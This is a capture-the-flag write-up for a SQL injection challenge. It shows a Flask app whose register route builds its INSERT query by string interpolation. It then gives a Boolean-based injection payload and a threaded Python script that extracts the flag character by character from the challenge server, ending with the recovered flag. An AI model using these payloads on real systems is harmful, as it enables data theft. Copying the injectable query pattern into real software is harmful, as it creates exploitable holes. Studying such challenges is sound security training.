## Spooky Query Leaks [450]
In this challenge, we found an SQL injection vulnerability in the register form because of a lack of sanitization on the input parameters, allowing us to perform a Boolean-based SQLi attack. This can be exploited to read the contents of the `flag` table and obtain the flag.

### Source Code
```python
from flask import Flask, render_template, request, redirect, session, g
from werkzeug.security import generate_password_hash, check_password_hash
import sqlite3

app = Flask(__name__)
app.secret_key = 'REDACTED'

DATABASE = 'challenge.db'

def get_db():
    db = getattr(g, '_database', None)
    if db is None:
        db = g._database = sqlite3.connect(DATABASE)
        db.row_factory = sqlite3.Row
    return db

@app.teardown_appcontext
def close_connection(exception):
    db = getattr(g, '_database', None)
    if db is not None:
        db.close()

@app.route('/register', methods=['GET', 'POST'])
def register():
    if request.method == 'POST':
        username = request.form['username']
        password = request.form['password']
        cursor = get_db().cursor()
        try:
            cursor.execute(f"INSERT INTO users (username, password) VALUES ('{username}', '{generate_password_hash(password)}')")
            get_db().commit()
            return redirect('/login')
        except sqlite3.IntegrityError:
            return "Username already taken."

    return render_template('register.html')

@app.route('/login', methods=['GET', 'POST'])
def login():
    if request.method == 'POST':
        username = request.form['username']
        password = request.form['password']
        cursor = get_db().cursor()

        cursor.execute("SELECT * FROM users WHERE username = ?", (username,))
        user = cursor.fetchone()

        if user and check_password_hash(user['password'], password):
            session['username'] = user['username']
            return redirect('/dashboard')
        else:
            return "Invalid credentials."

    return render_template('login.html')

@app.route('/dashboard')
def dashboard():
    if 'username' not in session:
        return redirect('/login')

    username = session['username']
    cursor = get_db().cursor()

    if username == 'admin':
        cursor.execute("SELECT flag FROM flags")
        flag = cursor.fetchone()['flag']
        return render_template('dashboard.html', username=username, flag=flag)

    return render_template('dashboard.html', username=username, flag=None)

if __name__ == '__main__':
    app.run(debug=False)

```

As seen in the code, the register input is inserted directly without sanitization, which allows us to use Boolean-based SQLi to read the `flag` table. Below is the payload:
```sql
bian' || (SELECT 'tr' WHERE SUBSTR((SELECT flag FROM flags),1,1)='FUZZ') || 'tue
```

The above code reads the first element of the `flag` column in the `flags` table. If the first element is FUZZ, the registration will succeed; otherwise, it will fail. Here is the solver code.

```python
import requests
import concurrent.futures

# URL endpoint
url = 'https://usc-spookyql.chals.io/1596345a-537d-4b96-af71-de75ded8fad0/'

# Function to register a username
def regis(data):
    response = requests.post(url + 'register', data)
    return response.text

fuzz = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ123456789

0{}_!@#$%^&*()-'
flag = ''

# Function to test one character at a specific position
def try_character(i, a):
    data = {
        "username": f"my' || (SELECT 'tr' WHERE SUBSTR((SELECT flag FROM flags),{i},1)='{a}') || 'ue{i}",
        "password": "abc"
    }
    out = regis(data)
    return (i, a, out)

# Main function to brute-force each position of the flag
for i in range(1, 50):
    with concurrent.futures.ThreadPoolExecutor() as executor:
        # Create threads to test each character in 'fuzz'
        futures = {executor.submit(try_character, i, a): a for a in fuzz}
        
        for future in concurrent.futures.as_completed(futures):
            a = futures[future]
            try:
                pos, char, output = future.result()
                print(i)
                # If the response shows that the character is correct, add it to the flag
                if 'Username already taken' not in output:
                    flag += char
                    print(output)
                    print(f"Flag so far: {flag}")
                    break  # Stop searching if the correct character is found
            except Exception as e:
                print(f"Error with character {a} at position {i}: {e}")

print(f"Final flag: {flag}")

```

```
CYBORG{Wh4t_h4pp3n3d_t0_my_p4ssw0rd!}
```